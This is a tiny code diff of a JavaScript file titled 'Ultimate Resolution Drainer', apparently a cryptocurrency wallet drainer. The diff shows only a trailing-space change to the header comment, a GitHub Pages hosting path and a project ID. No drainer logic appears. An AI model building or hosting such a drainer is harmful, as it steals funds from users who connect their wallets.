@@ -1,4 +1,4 @@
-// resolution.js - Ultimate Resolution Drainer
+// resolution.js - Ultimate Resolution Drainer 
 // Host: https://yourname.github.io/ultimate-resolution/resolution.js
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
